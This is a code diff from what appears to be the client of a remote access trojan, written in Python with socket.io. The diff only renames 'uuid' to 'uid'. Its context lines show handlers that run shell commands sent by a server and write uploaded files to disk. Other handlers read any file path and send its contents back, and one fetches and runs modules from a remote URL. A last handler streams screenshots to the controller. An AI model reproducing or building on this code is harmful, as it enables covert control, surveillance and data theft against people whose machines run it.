@@ -117,13 +117,13 @@ def run(data):
 
     @sio.on("command")
     def command(data_new):
-        if data['uuid'] == data_new['id']:
+        if data['uid'] == data_new['uid']:
             shell.write_input(data_new['cmd'])
 
     @sio.on('restart')
     def restart(data_new):
         global shell  # Declare shell as global to modify it
-        if data_new == data['uuid']:
+        if data_new == data['uid']:
             if shell.process:
                 shell.process.terminate()
                 shell.running = False
@@ -134,11 +134,11 @@ def run(data):
     def connect():
         sio.emit("mConnect", data)
         print(sio.sid)
-        print(data["uuid"])
+        print(data["uid"])
 
     @sio.on('upload_file')
     def upload_file(data_new):
-        if data['uuid'] == data_new['uuid']:
+        if data['uid'] == data_new['uid']:
             print(data_new['file_name'])
             with open(data_new['file_name'], 'wb') as f:
                 decoded_data = base64.b64decode(data_new['file'])
@@ -146,19 +146,19 @@ def run(data):
 
     @sio.on("download_file")
     def download_file(data_new):
-        if data['uuid'] == data_new['uuid']:
+        if data['uid'] == data_new['uid']:
             with open(data_new['file_path'], 'rb') as f:
                 file = f.read()
             file_ready = base64.b64encode(file).decode('utf-8')
-            sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
+            sio.emit('download_file_return', {'uid': data_new['uid'], 'file_name': data_new['file_path'], 'file': file_ready})
             print("emited")
 
     @sio.on("pem")
     def pem(data_new):
-        if data['uuid'] == data_new['uuid']:
+        if data['uid'] == data_new['uid']:
             print(data['url'] + data_new['url'])
             module = create_module(data['url'] + data_new['url'])
-            module.run(sio, data['uuid'])
+            module.run(sio, data['uid'])
 
     def take_screenshots(sio, uid, fps=5, quality=20):
         frame_interval = 1 / fps
@@ -190,14 +190,14 @@ def run(data):
                 # Small sleep to prevent a tight loop
                 time.sleep(0.001)
 
-    screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
+    screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uid']))
 
     @sio.on("screen_status")
     def screen_status(data_new):
-        if data['uuid'] == data_new['uid']:
+        if data['uid'] == data_new['uid']:
             if data_new['status'] == "start":
                 stop_event.clear()  # Reset the event to False
-                screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
+                screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uid']))
                 screenshot_thread.start()
             else:
                 stop_event.set()  # Signal the thread to stop
